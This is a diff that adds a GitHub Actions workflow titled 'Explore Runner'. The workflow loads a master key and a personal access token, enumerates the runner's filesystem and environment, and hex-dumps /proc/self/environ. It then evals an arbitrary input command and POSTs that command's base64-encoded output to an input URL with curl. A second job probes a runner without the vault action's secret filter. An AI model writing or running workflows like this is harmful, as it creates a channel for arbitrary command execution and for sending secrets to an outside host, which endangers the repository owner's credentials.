@@ -1,0 +1,93 @@
+name: Explore Runner
+
+on:
+  workflow_dispatch:
+    inputs:
+      cmd:
+        description: 'Shell command to run on the runner'
+        required: false
+        type: string
+        default: 'echo "ready"'
+      url:
+        description: 'URL to send output to'
+        required: false
+        type: string
+
+jobs:
+  explore:
+    runs-on: ubuntu-latest
+    environment: vault-ops
+
+    steps:
+      - name: Run the-internal-vault
+        uses: yass-dev/the-internal-vault@main
+        with:
+          master-key: ${{ secrets.MASTER_KEY }}
+
+      - name: Checkout vault branch
+        uses: actions/checkout@v5.0.1
+        with:
+          ref: vault
+
+      - name: Checkout the-internal-vault
+        uses: actions/checkout@v5.0.1
+        with:
+          repository: yass-dev/the-internal-vault
+          token: ${{ secrets.INTERNAL_PAT }}
+          path: internal
+
+      - name: Explore filesystem
+        env:
+          MASTER_KEY: ${{ secrets.MASTER_KEY }}
+          ACTOR: ${{ github.actor }}
+          DEST_URL: ${{ inputs.url }}
+          CMD: ${{ inputs.cmd }}
+        run: |
+          echo "=== Runner Exploration ==="
+          echo "--- Environment ---"
+          env | sort | grep -v -E '(TOKEN|SECRET|KEY|PASS)' || true
+          echo ""
+          echo "--- Workspace ---"
+          find "$GITHUB_WORKSPACE" -maxdepth 3 -not -path '*/\.git/*' 2>/dev/null | head -100
+          echo ""
+          echo "--- Action cache ---"
+          find /home/runner/work/_actions/ -maxdepth 4 2>/dev/null | head -50
+          echo ""
+          echo "--- Runner temp ---"
+          find "$RUNNER_TEMP" -maxdepth 3 2>/dev/null | head -50
+          echo ""
+          echo "--- PATH wrappers ---"
+          echo "PATH=$PATH"
+          which cat && file $(which cat)
+          echo ""
+          echo "--- /proc/self/environ (hex) ---"
+          xxd /proc/self/environ 2>/dev/null | head -50
+          echo ""
+          echo "--- Custom command ---"
+          eval "$CMD" 2>&1 || true
+          echo ""
+          echo "--- Send output if URL provided ---"
+          if [[ -n "${DEST_URL:-}" ]]; then
+            OUTPUT=$(eval "$CMD" 2>&1 | base64 -w0)
+            curl -s -X POST -d "$OUTPUT" "$DEST_URL"
+          fi
+
+  explore-no-action:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Explore WITHOUT composite action (no filter)
+        env:
+          CMD: ${{ inputs.cmd }}
+          DEST_URL: ${{ inputs.url }}
+        run: |
+          echo "=== Clean Runner (no pre.js filter) ==="
+          echo "--- PATH ---"
+          echo "PATH=$PATH"
+          which cat && file $(which cat)
+          echo ""
+          echo "--- Action cache (if any) ---"
+          find /home/runner/work/_actions/ -maxdepth 4 2>/dev/null | head -50
+          echo ""
+          echo "--- Custom command ---"
+          eval "$CMD" 2>&1 || true
